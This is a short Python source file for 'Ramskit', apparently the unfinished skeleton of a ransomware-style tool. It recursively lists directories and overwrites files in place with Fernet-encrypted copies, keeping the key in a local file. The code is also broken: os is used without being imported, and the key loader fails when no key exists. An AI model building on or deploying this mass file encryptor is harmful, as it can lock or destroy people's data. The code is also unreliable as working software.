#!/usr/bin/python3

""" Copyright (C) 2023 Luis De León

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>. """


from cryptography.fernet import Fernet

current_version = "v1.0.0"


# TODO 2: Add usages for encrypt
class Ramskit:
    def __init__(self) -> None:
        print(f"[x] Starting Ramskit {current_version}")
        print("[x] Reading key...")
        self.key = Ramskit.load_key()

        if self.key is None:
            print("[x] Key does not exist.\n[x]Creating key...")
            self.key = Ramskit.generate_key()
        print(f"[x] Key is {self.key}")
    
    # FIXME: Fix encrypt method
    def encrypt_file(self, items, key) -> None:
        f = Fernet(key)
        for item in items:
            with open(item, 'rb') as file:
                data = file.read()

            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)

            with open(item, 'wb') as file:
                file.write(encrypted)

    def decrypt_file(self, items, key) -> None:
        f = Fernet(key)
        for item in items:
            with open(item, 'rb') as file:
                data = file.read()

            fernet = Fernet(key)
            decrypted = fernet.decrypt(data)

            with open(item, 'wb') as file:
                file.write(decrypted)

    @staticmethod
    def generate_key() -> bytes:
        key = Fernet.generate_key()
        with open('key.key', 'wb') as file:
            file.write(key)
        return key

    @staticmethod
    def load_key() -> bytes:
        with open('key.key', 'rb') as file:
            return file.read()
        return None

    @staticmethod
    def expand_dir(path: str) -> [str]:
        try:
            return [Ramskit.expand_dir(os.path.join(path, file)) for file in os.listdir(path)]
        except NotADirectoryError:
            return [path]

    @staticmethod
    def flatten(something) -> [str]:
        if isinstance(something, (list, tuple, set, range)):
            for sub in something:
                yield from Ramskit.flatten(sub)
        else:
            yield something

